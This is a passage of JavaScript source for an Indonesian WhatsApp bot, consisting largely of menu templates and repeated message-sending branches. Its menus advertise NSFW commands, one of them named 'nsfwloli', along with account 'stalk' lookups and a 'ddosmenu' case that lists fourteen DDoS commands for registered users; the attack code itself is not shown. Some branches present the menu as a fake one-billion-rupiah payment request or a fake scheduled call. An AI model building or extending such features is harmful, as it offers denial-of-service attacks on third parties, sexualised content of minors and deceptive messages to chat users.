${global.tTeks}yuki *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yulibocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yumeko *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wallnime *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simboltengah}
${simbol0} *N S F W - M E N U*
${simboltengah}
${global.tTeks}nsfw *on / off*
${global.tTeks}nsfwvid *free only*
${global.tTeks}armpits *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gifhentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gifblowjob *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentaivid *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hentaivid2 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}hneko *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nwaifu *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}animespank *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}trap *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gasm *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ahegao *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ass *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}bdsm *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}blowjob *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cuckold *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cum *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cum_jpg *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}milf *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}eba *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ero *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}ecchi *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}femdom *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}foot *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}feets *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}gangbang *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}glasses *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}jahy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lewd *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}lewdk *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}masturbation *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}manga *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}neko-hentai *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}neko-hentai2 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}nsfwloli *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}rule34 *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}orgy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}onlyfans *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}panties *ғʀᴇᴇ ᴏɴʟʏ* 
${global.tTeks}pussy *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tentacles *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tits *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}thights *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}yuri *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}zettai *ғʀᴇᴇ ᴏɴʟʏ*
${simboltengah}
${simbol0} *A S U P A N - M E N U*
${simboltengah}
${global.tTeks}ometv *creator only*
${global.tTeks}tiktokgirl *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoknukthy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokkayes *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokpanrika *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoknotnot *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokghea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktoksantuy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokbocil *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}tiktokviral *premium only*
${global.tTeks}asupan *query*
${global.tTeks}asupan2
${global.tTeks}asupantiktok *query*
${simboltengah}
${simbol0} *C U C I  M A T A - M E N U*
${simboltengah}
${global.tTeks}art *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}awoo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bite *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blush *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bonk *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}bts *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanchina *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanhijaber *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanindo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanjepan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecankorea *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanmalaysia *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cecanvietnam *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cogan *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cringe *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}dance *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}elf *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}estetic *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}glomp *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}handhold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}happy *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}highfive *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}husbu *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}kanna *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}killimg *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lick *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}nom *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pat *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}poke *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}slap *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}smile *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}smug *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wave *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}wink *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}yeet *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simboltengah}
${simbol0} *I S L A M - M E N U*
${simboltengah}
${global.tTeks}alquran
${global.tTeks}alquranaudio
${global.tTeks}asmaulhusna
${global.tTeks}bacaanshalat
${global.tTeks}hadist
${global.tTeks}jadwalsholat
${global.tTeks}kisahnabi
${global.tTeks}listsurah
${global.tTeks}niatshalat
${global.tTeks}tafsirsurah
${simboltengah}
${simbol0} *E - P E R P U S - M E N U*
${simboltengah}
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴀɴᴀᴋ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʙᴜᴅᴀʏᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴄɪɴᴛᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɢᴀʟᴀᴜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɢᴏᴋɪʟ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɪɴꜱᴘɪʀᴀᴛɪꜰ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴊᴀᴡᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴊᴇᴘᴀɴɢ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴇʜɪᴅᴜᴘᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴇʟᴜᴀʀɢᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋᴏʀᴇᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴋʀɪꜱᴛᴇɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʟɪʙᴜʀᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʟɪɴɢᴋᴜɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴀʟᴀʏꜱɪᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴇɴɢʜᴀʀᴜᴋᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍɪꜱᴛᴇʀɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴍᴏᴛɪᴠᴀꜱɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪʜᴀᴛ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ɴᴀꜱɪᴏɴᴀʟɪꜱᴍᴇ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴏʟᴀʜʀᴀɢᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴀɴᴛɪᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴᴅɪᴅɪᴋᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴɢᴏʀʙᴀɴᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇɴʏᴇꜱᴀʟᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴊᴜᴀɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀᴘɪꜱᴀʜᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇʀꜱᴀʜᴀʙᴀᴛᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴘᴇᴛᴜᴀʟᴀɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴀᴍᴀᴅʜᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴇᴍᴀᴊᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴇɴᴜɴɢᴀɴ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀɪɴᴅᴜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴏʜᴀɴɪ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ʀᴏᴍᴀɴᴛɪꜱ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴀꜱᴛʀᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴇᴅɪʜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴇᴊᴀʀᴀʜ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ꜱᴜɴᴅᴀ 
${global.tTeks}ᴄᴇʀᴘᴇɴ ᴛᴇʀᴊᴇᴍᴀʜᴀɴ 
${simboltengah}
${simbol0} *B E R I T A - M E N U*
${simboltengah}
${global.tTeks}antara *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cnbc *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}cnn *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}daily *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}detik *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}fajar *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}indozone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}inews *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}jalantikus-meme *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kompas *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}kontan *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}layarkaca *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}merdeka *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}okezone *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}sindo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tempo *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}tribun *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wikipedia *ғʀᴇᴇ ᴏɴʟʏ*
${global.tTeks}wikimedia *ғʀᴇᴇ ᴏɴʟʏ*
${simboltengah}
${simbol0} *S T A L K - M E N U*
${simboltengah}
${global.tTeks}animestalk *anime*
${global.tTeks}codstalk *id*
${global.tTeks}stalktiktok *users*
${global.tTeks}ghstalk *users*
${global.tTeks}githubrepo *repo*
${global.tTeks}ipstalk *ip*
${global.tTeks}itunes *query*
${global.tTeks}mlstalk *id*
${global.tTeks}npmstalk *users*
${global.tTeks}npmjs *query*
${global.tTeks}pbstalk *users*
${global.tTeks}twstalk *users*
${global.tTeks}telegramstalk *username*
${global.tTeks}igstalk *users*
${global.tTeks}ffstalk *id*
${global.tTeks}enka *id*
${global.tTeks}genshin *name*
${global.tTeks}genshinchar *name*
${global.tTeks}ytchanel *query*
${simboltengah}
${simbol0} *O T O M A T I S - M E N U*
${simboltengah}
${global.tTeks}acc/addsaldo
${global.tTeks}bukti
${global.tTeks}checktopup
${global.tTeks}deposit
${global.tTeks}minsaldo
${global.tTeks}saldo
${global.tTeks}dana
${global.tTeks}gopay
${global.tTeks}qris
${global.tTeks}topup
${global.tTeks}transfer *nomor nominal*
${simboltengah}
${simbol0} *E G G V I P - M E N U*
${simboltengah}
${global.tTeks}addip *ip/link*
${global.tTeks}deleteip *ip*
${global.tTeks}listip
${simboltengah}
${simbol0} *A P I - M E N U*
${simboltengah}
${global.tTeks}apilol
${global.tTeks}apilolsc *apikey*
${global.tTeks}apineocek
${global.tTeks}apineosearch *apikey*
${global.tTeks}apiprem *username*
${global.tTeks}capi
${global.tTeks}cekapikey *apikey*
${global.tTeks}delapi *username*
${global.tTeks}delusrapi *username*
${global.tTeks}resetlimit
${simboltengah}
${simbol0} *S T O R E - M E N U*
${simboltengah}
${global.tTeks}batal
${global.tTeks}done
${global.tTeks}listpanel
${global.tTeks}listvps
${global.tTeks}proses
${global.tTeks}payment
${global.tTeks}reqpanel
${global.tTeks}reqvps
${global.tTeks}sewa
${global.tTeks}sewabot
${global.tTeks}sdomain
${global.tTeks}spanel
${global.tTeks}svps
${global.tTeks}sosmed
${global.tTeks}tunda
${simboltengah}
${simbol0} *T E S T I - M E N U*
${simboltengah}
${global.tTeks}donasi
${global.tTeks}testi1
${global.tTeks}testi2
${global.tTeks}testi3
${global.tTeks}testi4
${global.tTeks}testi5
${simboltengah}
${simbol0} *E P H O T O - M E N U*
${simboltengah}
${global.tTeks}glitchtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}writetext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}advancedglow *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}typographytext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}pixelglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}neonglitch *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}flagtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}flag3dtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}deletingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blackpinkstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}glowingtext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}underwatertext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}logomaker *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}cartoonstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}papercutstyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}watercolortext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}effectclouds *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}blackpinklogo *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}gradienttext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}summerbeach *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}luxurygold *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}multicoloredneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}sandsummer *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}galaxywallpaper *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}1917style *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}makingneon *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}royaltext *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}freecreate *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}galaxystyle *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${global.tTeks}lighteffects *ᴘʀᴇᴍɪᴜᴍ ᴏɴʟʏ*
${simboltengah}
${simbol0} *T E X T P R O - M E N U*
${simboltengah}
${global.tTeks}aovwall *text*
${global.tTeks}anonymhacker *text*
${global.tTeks}advanceglow *text*
${global.tTeks}avatarlolnew *text*
${global.tTeks}avatardota *text*
${global.tTeks}avenger *text*
${global.tTeks}bloodfrosted *text*
${global.tTeks}bokeh *text*
${global.tTeks}box3d *text*
${global.tTeks}breakwall *text*
${global.tTeks}cartoongravity *text*
${global.tTeks}cloud *text*
${global.tTeks}deluxesilver *text*
${global.tTeks}fireworksparkle *text*
${global.tTeks}futureneon *text*
${global.tTeks}fpslogo *text*
${global.tTeks}greenneon *text*
${global.tTeks}holographic *text*
${global.tTeks}horrorblood *text*
${global.tTeks}icecold *text*
${global.tTeks}jokerlogo *text*
${global.tTeks}lionlogo *text*
${global.tTeks}lighttext *text*
${global.tTeks}lolbanner *text*
${global.tTeks}logogaming *text*
${global.tTeks}luxury *text*
${global.tTeks}marvelstudio *text*
${global.tTeks}metaldark *text*
${global.tTeks}minion *text*
${global.tTeks}natureleaves *text*
${global.tTeks}neon *text*
${global.tTeks}neonlight *text*
${global.tTeks}newyearcard *text*
${global.tTeks}ninjalogo *text*
${global.tTeks}pubgmaskot *text*
${global.tTeks}pornhubmaker *text*
${global.tTeks}roadwarning *text*
${global.tTeks}sandengraved *text*
${global.tTeks}sandsummer *text*
${global.tTeks}sandwriting *text*
${global.tTeks}space *text*
${global.tTeks}starsnight *text*
${global.tTeks}strawberries *text*
${global.tTeks}steel3d *text*
${global.tTeks}summersand *text*
${global.tTeks}text1917 *text*
${global.tTeks}thunder *text*
${global.tTeks}toxic *text*
${global.tTeks}wooden3d *text*
${global.tTeks}wolflogo *text*
${simboltengah}
${simbol0} *D O M A I N - M E N U*
${simboltengah}
${global.tTeks}sdomain
${global.tTeks}addgc
${global.tTeks}delgc 
${global.tTeks}domain1 smtp1.my.id
${global.tTeks}domain2 sellerpanel-vvip.my.id
${global.tTeks}domain3 kayypedia.com
${global.tTeks}domain4 my-website.my.id
${global.tTeks}domain5 mefahri.biz.id
${global.tTeks}domain6 rafeyfah.my.id
${global.tTeks}domain7 pannel-pvrt.my.id
${global.tTeks}domain8 panelku-jasteb.my.id
${global.tTeks}domain9 digitalserver.biz.id
${global.tTeks}domain10 mypanell.biz.id
${global.tTeks}domain11 tokopanellku.my.id
${global.tTeks}domain12 panellstore.net
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://www.instagram.com/reel/C55gW3-SETH/?igsh=MTAwNW01cHIzOTdraA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'ddosmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `Haii ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼

${readmore}

${simbolatas}
${simbol0} *D D O S - M E N U*
${simboltengah}
${global.tTeks}ddos
${global.tTeks}ddos-mix
${global.tTeks}ddos-v1
${global.tTeks}ddos-v2
${global.tTeks}ddos-v3
${global.tTeks}ddos-v4
${global.tTeks}ddos-v5
${global.tTeks}ddos-v6
${global.tTeks}ddos-v7
${global.tTeks}ddos-v8
${global.tTeks}ddos-v9
${global.tTeks}ddos-v10
${global.tTeks}ddos-v11
${global.tTeks}ddos-v12
${simbolbawah}
${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
